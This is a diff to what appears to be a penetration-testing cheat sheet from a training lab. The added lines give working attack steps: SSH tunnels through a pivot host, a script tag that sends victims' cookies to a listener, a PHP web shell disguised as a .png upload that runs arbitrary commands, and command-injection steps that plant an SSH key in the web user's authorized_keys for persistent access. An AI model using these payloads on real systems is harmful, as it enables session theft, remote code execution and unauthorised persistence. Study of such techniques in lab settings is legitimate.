@@ -53,7 +53,11 @@ proxychains nmap 10.208.50.42
 
 # Tunnel to...
 10.208.50.42
+
 22/tcp open  ssh
+ssh -S /tmp/demo demo -O forward -L42071:10.208.50.42:22
+ssh -MS /tmp/t1 -i $HOME/.ssh/id_rsa www-data@127.0.0.1 -p 42071 -fN 2>/dev/null
+
 80/tcp open  http
 ssh -S /tmp/demo demo -O forward -L42070:10.208.50.42:80  #Executed from lin-ops
 
@@ -87,6 +91,56 @@ nc -lk 10.50.187.52 42071  # Where you want to intercept cookie
 
 Post to chat...
 <script>document.location="http://10.50.187.52:42070/?username=" + document.cookie;</script>
+
+# Malicious upload requires 1. Upload, 2. Find uploads, 3. Call uploads
+
+touch 503.png.php
+<HTML><BODY>
+  <FORM METHOD="GET" NAME="myform" ACTION="">
+  <INPUT TYPE="text" NAME="cmd">
+  <INPUT TYPE="submit" VALUE="Send">
+  </FORM>
+  <pre>
+  <?php
+  if($_GET['cmd']) {
+    system($_GET['cmd']);
+    }
+  ?>
+  </pre>
+  </BODY></HTML>
+#Travel to /uploads URL
+
+### SSH KEYGEN ###
+Identify user and home directory using whoami and cat /etc/passwd
+
+# Generate our key
+### From lin-ops
+ssh-keygen -t rsa -b 4096 # Enter for default option
+No Passphrase
+cat /home/student/.ssh/id_rsa.pub
+
+## On Target, make directory and verify
+; mkdir /var/www/.ssh
+; ls -la /var/www
+
+## One Target, upload key and verify
+; echo "" > /var/www/.ssh/authorized_keys # Paste whole key into echo
+; cat /var/www/.ssh/authorized_keys
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 
 
 
